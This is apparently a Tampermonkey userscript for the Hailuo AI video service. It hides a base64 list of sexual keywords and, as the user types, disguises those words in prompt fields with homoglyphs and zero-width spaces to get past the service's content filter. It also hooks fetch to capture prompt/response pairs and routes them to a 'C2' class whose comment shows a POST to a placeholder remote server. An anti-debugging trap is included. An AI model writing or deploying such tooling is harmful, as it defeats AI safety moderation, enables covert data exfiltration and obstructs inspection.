// ==UserScript==
// @name         4ndr0tools – HailuoBETA
// @namespace    https://github.com/4ndr0666/userscripts
// @author       4ndr0666
// @version      1.0.0
// @description  Newest feature(testing) DOM disruption with network-level interception worked.
// @icon         https://raw.githubusercontent.com/4ndr0666/4ndr0site/refs/heads/main/static/cyanglassarch.png
// @match        *://*.hailuoai.video/*
// @match        *://*.hailuoai.com/*
// @run-at       document-start
// @grant        GM_setValue
// @grant        GM_getValue
// @grant        GM_registerMenuCommand
// @license      MIT
// ==/UserScript==

(() => {
  'use strict';

  // --- CONFIGURATION ---
  const CONFIG = {
    get networkInterceptEnabled() {
      return GM_getValue('networkInterceptEnabled', true);
    },
    set networkInterceptEnabled(value) {
      GM_setValue('networkInterceptEnabled', value);
    },
    get antiAnalysisEnabled() {
      return GM_getValue('antiAnalysisEnabled', true);
    },
    set antiAnalysisEnabled(value) {
      GM_setValue('antiAnalysisEnabled', value);
    },
  };

  // --- NOMENCLATURE ---
  const nom = (() => {
    const r = () => Math.random().toString(36).substring(2, 10);
    const prefix = `ψ_${r()}`;
    return {
      singleton: `_hk_${r()}`,
      hooked: `${prefix}_hooked`,
    };
  })();

  if (window[nom.singleton]) return;
  Object.defineProperty(window, nom.singleton, { value: true, writable: false });

  // --- CORE PAYLOADS ---
  const Obfuscator = class {
    static TRIGGERS = atob(
      'YXNzLGFuYWwsYXNzaG9sZSxhbnVzLGFyZW9sYSxhcmVvbGFzLGJsb3dqb2IsYm9vYnMsYm91bmNlLGJvdW5jaW5nLGJyZWFzdCxicmVhc3RzLGJ1a2FrZSxidXR0Y2hlZWtzLGJ1dHQsY2hlZWtzLGNsaW1heCxjbGl0LGNsZWF2YWdlLGNvY2ssY29ycmlkYXMsY3JvdGNoLGN1bSxjdW1zLGN1bG8sY3VudCxkZWVwLGRlZXB0aHJvYXQsZGVlcHRocm9hdGluZyxkZWVwdGhyb2F0ZWQsZGljayxlc3Blcm1hLGZhdCBhc3MsZmVsbGF0aW8sZmluZ2VyaW5nLGZ1Y2ssZnVja2luZyxmdWNrZWQsaG9ybnksbGljayxtYXN0dXJiYXRlLG1hc3RlcmJhdGluZyxtaXNzaW9uYXJ5LG1lbWJlcixtZWNvLG1vYW4sbW9hbmluZyxuaXBwbGUsbnNmdyxvcmFsLG9yZ2FzbSxwZW5pcyxwaGFsbHVzLHBsZWFzdXJlLHB1c3N5LHJ1bXAsc2VtZW4sc2VkdWN0aXZlbHksc2x1dCxzZHV0dHksc3Bsb29nZSxzcXVlZXppbmcsc3F1ZWV6ZSxzdWNrLHN1Y2tpbmcuc3dhbGxvdyx0aHJvYXQsdGhyb2F0aW5nLHRpdHMsdGl0LHRpdHR5LHRpdGZ1Y2ssdGl0dGllcyx0aXR0eWRyb3AsdGl0dHlmdWNrLHRpdGZ1Y2ssdHJhbnN2ZXN0aXRlLHZhZ2luYSx3aWVuZXIsd2hvcmUsY3JlYW1waWUsY3Vtc2hvdCxjdW5uaWxpbmd1cyxkb2dneXN0eWxlLGVqYWN1bGF0ZSxlamFjdWxhdGlvbixaYW51c2EsbGFiaWEsbnVkZSxvcmd5LHBvcm4scHJvbGFwc2UscmVjdHVtLHJpbWpvYixzZXN1YWwsc3RyaXBwZXIsc3VibWlzc2l2ZSx0ZWFidWcsdGhyZWVzb21lLHZpYnJhdG9yLHZveWV1cix3aG9yZSx0aG9uZw=='
    ).split(',');
    static HOMO = { a: 'а', c: 'с', e: 'е', i: 'і', o: 'о', p: 'р', s: 'ѕ', x: 'х', y: 'у', k: 'κ', t: 'т' };
    static ZWSP = '\u200B';
    static REGEX = new RegExp(`\\b(${this.TRIGGERS.join('|')})\\b`, 'gi');

    static disrupt(str) {
      if (typeof str !== 'string' || !str) return str;
      return str.replace(this.REGEX, (match) =>
        match.split('').map((char) => this.HOMO[char.toLowerCase()] ?? char).join(this.ZWSP)
      );
    }
  };

  const C2 = class {
    static send(data) {
      // Default C2 is the console. Modify here to send to a remote endpoint.
      // Example: fetch('https://your-c2-server.com/log', { method: 'POST', body: JSON.stringify(data) });
      console.groupCollapsed(`[Ψ-4ndr0coder :: EXFIL] - ${new Date().toISOString()}`);
      console.log('Captured Intelligence Packet:');
      console.dir(data);
      console.groupEnd();
    }
  };

  // --- EXECUTION VECTORS ---
  const DOMVector = class {
    static hookedElements = new WeakSet();
    static INPUT_SELECTORS = 'textarea, input[type="text"], [contenteditable="true"]';

    static disruptor(event) {
      const el = event.target;
      const originalValue = el.value ?? el.innerText;
      const disruptedValue = Obfuscator.disrupt(originalValue);

      if (disruptedValue !== originalValue) {
        if (el.value !== undefined) el.value = disruptedValue;
        if (el.innerText !== undefined) el.innerText = disruptedValue;
        GM_setValue('lastDisruptionLog', {
          timestamp: Date.now(),
          disrupted: originalValue.match(Obfuscator.REGEX) || [],
        });
      }
    }

    static hookElement(el) {
      if (this.hookedElements.has(el)) return;
      el.addEventListener('input', this.disruptor);
      el.addEventListener('blur', this.disruptor);
      this.hookedElements.add(el);
    }

    static scanNode(node) {
      if (node.nodeType !== Node.ELEMENT_NODE) return;
      if (node.matches(this.INPUT_SELECTORS)) {
        this.hookElement(node);
      }
      node.querySelectorAll(this.INPUT_SELECTORS).forEach((el) => this.hookElement(el));
    }

    static init() {
      const observer = new MutationObserver((mutations) => {
        for (const mutation of mutations) {
          mutation.addedNodes.forEach((node) => this.scanNode(node));
        }
      });
      observer.observe(document.documentElement, { childList: true, subtree: true });
      document.querySelectorAll(this.INPUT_SELECTORS).forEach((el) => this.hookElement(el));
    }
  };

  const NetworkVector = class {
    static originalFetch = window.fetch;

    static async handleRequest(url, options) {
      if (!CONFIG.networkInterceptEnabled || !options?.body || typeof options.body !== 'string') {
        return this.originalFetch(url, options);
      }

      try {
        const body = JSON.parse(options.body);
        // Heuristic to identify a prompt. Adapt if target API changes.
        const isPrompt = Object.values(body).some(v => typeof v === 'string' && v.length > 20);

        if (isPrompt) {
          const originalPrompt = JSON.parse(JSON.stringify(body)); // Deep clone original data
          const response = await this.originalFetch(url, options);
          const clonedResponse = response.clone();
          const responseData = await clonedResponse.json().catch(() => clonedResponse.text());

          C2.send({
            type: 'PROMPT_RESPONSE_PAIR',
            timestamp: Date.now(),
            url: url.toString(),
            originalPrompt,
            aiResponse: responseData,
          });

          return response;
        }
      } catch (e) {
        // Not a JSON body or other error, ignore and pass through.
      }

      return this.originalFetch(url, options);
    }

    static init() {
      window.fetch = async (url, options) => {
        return this.handleRequest(url, options);
      };
    }
  };

  const AntiAnalysis = class {
    static trapInterval = null;

    static trap() {
      const check = () => {
        function doCheck() {
          // This function is trapped by the debugger
          debugger;
        }
        try {
          doCheck();
        } catch (err) {}
      };

      if (this.trapInterval) clearInterval(this.trapInterval);
      this.trapInterval = setInterval(check, 500);
      console.warn('[Ψ-4ndr0coder] Anti-Analysis Trap is ARMED.');
    }

    static disarm() {
      if (this.trapInterval) {
        clearInterval(this.trapInterval);
        this.trapInterval = null;
        console.log('[Ψ-4ndr0coder] Anti-Analysis Trap DISARMED.');
      }
    }

    static init() {
      if (CONFIG.antiAnalysisEnabled) {
        this.trap();
      }
    }
  };

  // --- UI & INITIALIZATION ---
  const UI = class {
    static updateMenu() {
      // This function will be called to re-register menu commands with updated labels
      // Note: Tampermonkey doesn't support dynamic menu updates well, this is for future-proofing
    }
    static init() {
      GM_registerMenuCommand(
        `[${CONFIG.networkInterceptEnabled ? '✅' : '❌'}] Network Interception`,
        () => {
          CONFIG.networkInterceptEnabled = !CONFIG.networkInterceptEnabled;
          alert(`Network Interception is now ${CONFIG.networkInterceptEnabled ? 'ENABLED' : 'DISABLED'}.`);
        }
      );
      GM_registerMenuCommand(
        `[${CONFIG.antiAnalysisEnabled ? '✅' : '❌'}] Anti-Analysis Trap`,
        () => {
          CONFIG.antiAnalysisEnabled = !CONFIG.antiAnalysisEnabled;
          if (CONFIG.antiAnalysisEnabled) AntiAnalysis.trap();
          else AntiAnalysis.disarm();
          alert(`Anti-Analysis Trap is now ${CONFIG.antiAnalysisEnabled ? 'ENABLED' : 'DISABLED'}.`);
        }
      );
    }
  };

  // --- LAUNCH SEQUENCE ---
  DOMVector.init();
  NetworkVector.init();
  AntiAnalysis.init();
  UI.init();
})();
